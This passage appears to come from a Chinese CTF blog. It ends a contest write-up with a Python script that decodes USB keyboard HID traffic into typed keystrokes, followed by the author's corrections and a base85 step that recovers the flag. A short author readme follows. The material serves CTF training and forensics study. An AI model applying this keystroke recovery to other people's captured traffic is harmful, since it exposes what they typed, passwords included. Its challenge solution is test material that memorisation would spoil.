class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">BYTE1 --</span></span><br><span class="line"><span class="string">       |--bit0:   Left Control是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit1:   Left Shift  是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit2:   Left Alt    是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit3:   Left GUI    是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit4:   Right Control是否按下，按下为1  </span></span><br><span class="line"><span class="string">       |--bit5:   Right Shift 是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit6:   Right Alt   是否按下，按下为1 </span></span><br><span class="line"><span class="string">       |--bit7:   Right GUI   是否按下，按下为1 </span></span><br><span class="line"><span class="string">BYTE2 -- 暂不清楚，有的地方说是保留位</span></span><br><span class="line"><span class="string">BYTE3--BYTE8 -- 这六个为普通按键</span></span><br><span class="line"><span class="string">from: https://blog.csdn.net/fjh1997/article/details/105841367</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tools</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;输入同级目录下的名称&quot;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line">FILE_PATH = os.path.abspath(args.f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;</span><br><span class="line">        <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">        <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>, <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;&lt;ALT&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>, <span class="string">&quot;4a&quot;</span>:<span class="string">&quot;&lt;HOME&gt;&quot;</span>, <span class="string">&quot;4c&quot;</span>:<span class="string">&quot;&lt;DELETE&gt;&quot;</span>, <span class="string">&quot;4d&quot;</span>:<span class="string">&quot;&lt;END&gt;&quot;</span>, <span class="string">&quot;4f&quot;</span>:<span class="string">&quot;&lt;RightArrow&gt;&quot;</span>, </span><br><span class="line">        <span class="string">&quot;50&quot;</span>:<span class="string">&quot;&lt;LeftArrow&gt;&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;&lt;DownArrow&gt;&quot;</span>, <span class="string">&quot;52&quot;</span>: <span class="string">&quot;&lt;UpArrow&gt;&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;&lt;NumLock&gt;&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;/&quot;</span>, </span><br><span class="line">        <span class="string">&quot;55&quot;</span>:<span class="string">&quot;*&quot;</span>, <span class="string">&quot;56&quot;</span>:<span class="string">&quot;-&quot;</span>, <span class="string">&quot;57&quot;</span>:<span class="string">&quot;+&quot;</span>, <span class="string">&quot;58&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;59&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;5a&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;5b&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;5c&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;5d&quot;</span>:<span class="string">&quot;5&quot;</span>, </span><br><span class="line">        <span class="string">&quot;5e&quot;</span>:<span class="string">&quot;6&quot;</span>, <span class="string">&quot;5f&quot;</span>:<span class="string">&quot;7&quot;</span>, <span class="string">&quot;60&quot;</span>:<span class="string">&quot;8&quot;</span>, <span class="string">&quot;61&quot;</span>:<span class="string">&quot;9&quot;</span>, <span class="string">&quot;62&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">        <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, </span><br><span class="line">        <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">        <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;&lt;ALT&gt;&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;:&quot;</span>,</span><br><span class="line">        <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>, </span><br><span class="line">        <span class="string">&quot;4a&quot;</span>:<span class="string">&quot;&lt;HOME&gt;&quot;</span>, <span class="string">&quot;4c&quot;</span>:<span class="string">&quot;&lt;DELETE&gt;&quot;</span>, <span class="string">&quot;4d&quot;</span>:<span class="string">&quot;&lt;END&gt;&quot;</span>, <span class="string">&quot;4f&quot;</span>:<span class="string">&quot;&lt;RightArrow&gt;&quot;</span>, </span><br><span class="line">        <span class="string">&quot;50&quot;</span>:<span class="string">&quot;&lt;LeftArrow&gt;&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;&lt;DownArrow&gt;&quot;</span>, <span class="string">&quot;52&quot;</span>: <span class="string">&quot;&lt;UpArrow&gt;&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;&lt;NumLock&gt;&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;/&quot;</span>, </span><br><span class="line">        <span class="string">&quot;55&quot;</span>:<span class="string">&quot;*&quot;</span>, <span class="string">&quot;56&quot;</span>:<span class="string">&quot;-&quot;</span>, <span class="string">&quot;57&quot;</span>:<span class="string">&quot;+&quot;</span>, <span class="string">&quot;58&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;59&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;5a&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;5b&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;5c&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;5d&quot;</span>:<span class="string">&quot;5&quot;</span>, </span><br><span class="line">        <span class="string">&quot;5e&quot;</span>:<span class="string">&quot;6&quot;</span>, <span class="string">&quot;5f&quot;</span>:<span class="string">&quot;7&quot;</span>, <span class="string">&quot;60&quot;</span>:<span class="string">&quot;8&quot;</span>, <span class="string">&quot;61&quot;</span>:<span class="string">&quot;9&quot;</span>, <span class="string">&quot;62&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> FILE_PATH.endswith(<span class="string">&quot;.txt&quot;</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FILE_PATH, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().splitlines()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = tools.get_data(FILE_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>(<span class="params">original=<span class="literal">False</span></span>):</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">4</span>:<span class="number">6</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> original <span class="keyword">and</span> line[<span class="number">4</span>:<span class="number">6</span>] == <span class="string">&quot;2a&quot;</span>:</span><br><span class="line">            output = output[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">4</span>:<span class="number">6</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">            output.append(shiftKeys[line[<span class="number">4</span>:<span class="number">6</span>]] <span class="keyword">if</span> (<span class="built_in">int</span>(line[:<span class="number">2</span>], <span class="number">16</span>) &gt;&gt; <span class="number">1</span> &amp; <span class="number">1</span> == <span class="number">1</span>) <span class="keyword">or</span> (<span class="built_in">int</span>(line[:<span class="number">2</span>], <span class="number">16</span>) &gt;&gt; <span class="number">6</span> &amp; <span class="number">1</span> == <span class="number">1</span>) <span class="keyword">else</span> normalKeys[line[<span class="number">4</span>:<span class="number">6</span>]])</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">data = get_info(<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始数据: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(data)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&lt;SPACE&gt;&quot;</span>:</span><br><span class="line">        flag.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;&lt;ALT&gt;&quot;</span>:</span><br><span class="line">        flag.append(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">        flag.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;&lt;RET&gt;&quot;</span>:</span><br><span class="line">        flag.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;&lt;DEL&gt;&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> flag != []:</span><br><span class="line">            flag.pop(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正常数据: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(flag)&#125;</span>&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pause&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到：Ao(mgHy&lt; DEL&gt;Y$&lt;CAP&gt;a@q7&lt; CAP&gt;gW2D$dE@6#oO0f&lt;Gm1hAI’&#x2F;N#4C&lt; DEL&gt;&lt;AN;&lt; CAP&gt;ms@p&lt; CAP&gt;frQ149K&lt; DELETE&gt;</p><p>然后得根据那些键位自己改一下，根据删除键和大小写修改建进行修改（为什么知道要修改的一个原因是放进赛博厨子后出现个”flag{“，但后面就是乱码了）</p><p>改完后为：Ao(mgHY$\A@Q7gW2D$dE@6#oO0f&lt;Gm1hAI’&#x2F;N#4&lt;AN;MS@PfrQ149K</p><p>放进赛博厨子里base85后即可得到flag：</p><p><img src="/img/hws%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9Bwp/4.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>readme</title>
      <link href="/2023/07/13/readme/"/>
      <url>/2023/07/13/readme/</url>
      
        <content type="html"><![CDATA[<p>关于本人：she1p🐏，Xp0int战队成员，一名混子pwn手</p><p>本博客会发一些比赛的wp（如果做得出来感觉有质量的题的话）和一些学习心得，假期尽量多发（尽量），欢迎各位师傅友好交流° (๑´ڡ&#96;๑)</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
